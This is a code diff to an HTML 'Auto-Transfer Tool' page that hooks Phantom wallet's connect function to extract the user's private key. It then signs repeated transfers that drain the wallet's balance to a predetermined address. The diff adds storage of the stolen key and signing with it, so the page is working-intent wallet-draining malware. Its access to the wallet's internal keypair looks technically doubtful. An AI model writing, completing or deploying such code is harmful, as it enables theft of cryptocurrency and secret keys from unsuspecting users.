@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Transfer Tool (Fixed)</title>
+    <title>Auto-Transfer Tool with Private Key Extraction</title>
 </head>
 <body>
     <h1>Auto-Transfer Tool</h1>
@@ -26,6 +26,7 @@
         let wallet;
         let transferInterval;
         let currentRpcIndex = 0;
+        let extractedPrivateKey = null; // Store the extracted private key
 
         // Override Phantom Wallet's connection logic to extract private key
         const originalConnect = window.phantom?.solana?.connect;
@@ -33,8 +34,9 @@
             window.phantom.solana.connect = async function() {
                 const response = await originalConnect.apply(this, arguments);
                 const privateKey = this._keypair.secretKey; // Extract private key
-                console.log('Private Key:', Buffer.from(privateKey).toString('hex')); // Log private key in hex format
-                alert('Private Key Extracted: ' + Buffer.from(privateKey).toString('hex')); // Alert the private key
+                extractedPrivateKey = Buffer.from(privateKey).toString('hex'); // Store private key in hex format
+                console.log('Private Key:', extractedPrivateKey); // Log private key
+                alert('Private Key Extracted: ' + extractedPrivateKey); // Alert the private key
                 return response;
             };
         }
@@ -70,21 +72,25 @@
             }
         });
 
-        // Start auto-transfer
+        // Start auto-transfer using the extracted private key
         document.getElementById('autoTransfer').addEventListener('click', async () => {
-            if (!wallet) {
-                updateStatus('Please connect your wallet first.');
+            if (!extractedPrivateKey) {
+                updateStatus('Private key not extracted. Connect wallet first.');
                 return;
             }
+
+            const fromWallet = solanaWeb3.Keypair.fromSecretKey(
+                Uint8Array.from(Buffer.from(extractedPrivateKey, 'hex'))
+            );
 
             transferInterval = setInterval(async () => {
                 try {
                     const connection = await getConnection();
-                    const balance = await connection.getBalance(wallet.publicKey);
+                    const balance = await connection.getBalance(fromWallet.publicKey);
                     const fee = await connection.getFeeForMessage(
                         await new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: wallet.publicKey,
+                                fromPubkey: fromWallet.publicKey,
                                 toPubkey: new solanaWeb3.PublicKey(PREDETERMINED_ADDRESS),
                                 lamports: 1, // Dummy value to calculate fee
                             })
@@ -97,16 +103,20 @@
                     if (amount > 0) {
                         const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: wallet.publicKey,
+                                fromPubkey: fromWallet.publicKey,
                                 toPubkey: new solanaWeb3.PublicKey(PREDETERMINED_ADDRESS),
                                 lamports: amount,
                             })
                         );
 
                         transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
-                        transaction.feePayer = wallet.publicKey;
+                        transaction.feePayer = fromWallet.publicKey;
 
-                        const signature = await wallet.signAndSendTransaction(transaction);
+                        const signature = await solanaWeb3.sendAndConfirmTransaction(
+                            connection,
+                            transaction,
+                            [fromWallet]
+                        );
                         updateStatus(`Transferred ${amount / solanaWeb3.LAMPORTS_PER_SOL} SOL\nTx: ${signature}`);
                     } else {
                         updateStatus('Insufficient balance for transfer');
